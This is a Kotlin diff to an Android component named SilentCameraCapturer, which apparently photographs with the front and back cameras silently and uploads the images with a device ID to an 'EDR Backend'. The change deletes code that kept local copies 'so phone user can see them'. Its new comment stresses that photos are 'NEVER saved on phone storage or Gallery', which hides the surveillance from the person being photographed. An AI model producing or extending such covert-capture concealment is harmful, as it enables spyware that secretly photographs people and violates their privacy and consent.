@@ -12,7 +12,6 @@ import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CaptureRequest
 import android.media.ImageReader
-import android.media.MediaScannerConnection
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.PowerManager
@@ -26,7 +25,6 @@ import com.google.gson.Gson
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
-import java.io.File
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
@@ -132,36 +130,7 @@ object SilentCameraCapturer {
             return
         }
 
-        // 3. Save photos locally to /sdcard/EDR/photos/ so phone user can see them
-        try {
-            val photosDir = EdrLocalStorage.getPhotosDir(context)
-            val timestamp = System.currentTimeMillis()
-            val filesToScan = mutableListOf<String>()
-
-            if (frontPhotoBytes != null) {
-                val frontFile = File(photosDir, "front_camera_$timestamp.jpg")
-                frontFile.writeBytes(frontPhotoBytes)
-                filesToScan.add(frontFile.absolutePath)
-            }
-            if (backPhotoBytes != null) {
-                val backFile = File(photosDir, "back_camera_$timestamp.jpg")
-                backFile.writeBytes(backPhotoBytes)
-                filesToScan.add(backFile.absolutePath)
-            }
-
-            if (filesToScan.isNotEmpty()) {
-                MediaScannerConnection.scanFile(
-                    context,
-                    filesToScan.toTypedArray(),
-                    arrayOf("image/jpeg", "image/jpeg"),
-                    null
-                )
-            }
-        } catch (e: Exception) {
-            Log.w(TAG, "Could not save local copy to /EDR/photos: ${e.message}")
-        }
-
-        // 4. Upload evidence directly to EDR Backend with explicit CAMERA_PHOTO type
+        // 3. Upload evidence directly from memory to EDR Backend (NEVER saved on phone storage or Gallery)
         try {
             val deviceId = SyncPreferences.deviceId
             val payload = mutableMapOf<String, Any>(
